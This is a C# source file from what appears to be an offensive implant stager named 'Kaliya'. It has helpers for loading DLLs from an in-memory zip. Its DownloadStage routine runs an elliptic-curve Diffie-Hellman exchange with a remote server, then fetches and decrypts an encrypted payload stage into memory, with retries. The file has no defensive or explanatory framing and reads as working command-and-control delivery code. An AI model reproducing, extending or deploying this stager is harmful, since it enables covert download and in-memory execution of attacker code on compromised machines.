using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Math;
using Kaliya.Crypto;
using Kaliya.Utils;

namespace Kaliya
{
    internal static class Core
    {
        public static string GetDLLName(string name)
        {
            string dllName = name + ".dll";
            if (name.IndexOf(',') > 0)
            {
                dllName = name.Substring(0, name.IndexOf(',')) + ".dll";
            }
            return dllName;
        }

        public static byte[] GetResourceInZip(ZipStorer zip, string name)
        {
            foreach (var entry in zip.ReadCentralDir())
            {
                if (entry.FilenameInZip == name)
                {
                    var resdata = new byte[entry.FileSize];
                    zip.ExtractFile(entry, out resdata);
                    return resdata;
                }
            }
            return default;
        }

        public static MemoryStream DownloadStage(Uri URL, int sleep = 10, int retries = 5)
        {
            return Retry.Do(() =>
            {
                var crypto = GetECDeffieHellmanCrypto(URL);
                var key = crypto.GenerateAESKey();
                var stage = crypto.Decrypt(key, Http.Get(URL));
                return new MemoryStream(stage);
            }, TimeSpan.FromSeconds(sleep), retries);
        }

        static ECDeffieHellman GetECDeffieHellmanCrypto(Uri uri)
        {
            var crypto = new ECDeffieHellman();
            var publicKey = crypto.PublicKey.Q.Normalize();

            // Really ugly, I know, but we're trying to reduce extra dependencies...
            string json = string.Format("{{'x': \"{0}\",'y': \"{1}\"}}",
                    publicKey.AffineXCoord,
                    publicKey.AffineYCoord
                );

            string response = Encoding.UTF8.GetString(Http.Post(uri,
                                 Encoding.UTF8.GetBytes(json))).Replace("\"", "'");

            // Really ugly, I know, but we're trying to reduce extra dependencies...
            MatchCollection mcx = new Regex(@"': (.+?) ").Matches(response);
            string mcy = response.Substring(response.LastIndexOf(": ",
                            StringComparison.Ordinal) + 1).Replace("}", "").Trim();

            crypto.GenerateServerPublicKey(new KeyCoords
            {
                x = new BigInteger(mcx[0].Value.Replace("': ", "").Replace(", ", "")),
                y = new BigInteger(mcy)
            });

            return crypto;
        }
    }
}
